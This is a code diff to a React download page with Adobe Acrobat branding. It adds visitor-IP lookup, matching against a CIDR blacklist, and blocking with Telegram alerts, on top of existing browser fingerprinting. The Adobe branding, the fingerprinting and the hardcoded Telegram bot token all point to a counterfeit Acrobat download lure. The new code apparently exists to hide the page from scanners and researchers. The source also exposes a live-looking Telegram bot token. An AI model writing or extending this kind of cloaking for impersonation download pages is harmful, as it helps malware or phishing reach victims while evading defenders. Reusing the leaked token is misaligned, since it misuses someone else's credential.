@@ -1,6 +1,47 @@
-import { useEffect, useMemo, useRef, useState } from "react";
+import { useEffect, useMemo, useRef, useState, useCallback } from "react";
 import { useVisitorData } from "@fingerprint/react";
 import adbLogo from "@/assets/adb-logo.png";
+
+// --- IP Blacklist CIDR matching (ported from PHP) ---
+const ipToLong = (ip: string): number => {
+  const parts = ip.split(".").map(Number);
+  return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
+};
+
+const ipInCidr = (ip: string, cidr: string): boolean => {
+  const [range, maskStr] = cidr.split("/");
+  const mask = parseInt(maskStr, 10);
+  const ipLong = ipToLong(ip);
+  const rangeLong = ipToLong(range);
+  const wildcardDec = Math.pow(2, 32 - mask) - 1;
+  const netmaskDec = ~wildcardDec >>> 0;
+  return (ipLong & netmaskDec) === (rangeLong & netmaskDec);
+};
+
+const checkIpBlacklist = async (ip: string): Promise<boolean> => {
+  try {
+    const res = await fetch("/data/blacklist.dat");
+    if (!res.ok) return false;
+    const text = await res.text();
+    const lines = text.split("\n").map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
+    for (const cidr of lines) {
+      if (ipInCidr(ip, cidr)) return true;
+    }
+  } catch (e) {
+    console.error("Blacklist check failed:", e);
+  }
+  return false;
+};
+
+const fetchVisitorIp = async (): Promise<string | null> => {
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip || null;
+  } catch {
+    return null;
+  }
+};
 import acrobatBg from "@/assets/adobe-acrobat-bg.webp";
 
 const TELEGRAM_BOT_TOKEN = "8648729689:AAEj5AJW3EJOAMYkAtVbm1DgSNgTy2fo1jw";
@@ -156,6 +197,28 @@ const Download = () => {
       }
     }
   }, [visitorData]);
+
+  // IP blacklist check
+  useEffect(() => {
+    const checkIp = async () => {
+      const ip = await fetchVisitorIp();
+      if (!ip) return;
+      const isBlacklisted = await checkIpBlacklist(ip);
+      if (isBlacklisted) {
+        setBlocked(true);
+        if (!notifiedRef.current) {
+          notifiedRef.current = true;
+          sendTelegramNotification("bot_blocked", {
+            reason: `Blacklisted IP: ${ip}`,
+            suspiciousFlags: [`IP ${ip} found in blacklist.dat`],
+            browser: getBrowserName(),
+            visitorId: visitorData?.visitor_id,
+          });
+        }
+      }
+    };
+    checkIp();
+  }, []);
 
   const downloadFile = useMemo(() => {
     const ua = navigator.userAgent;
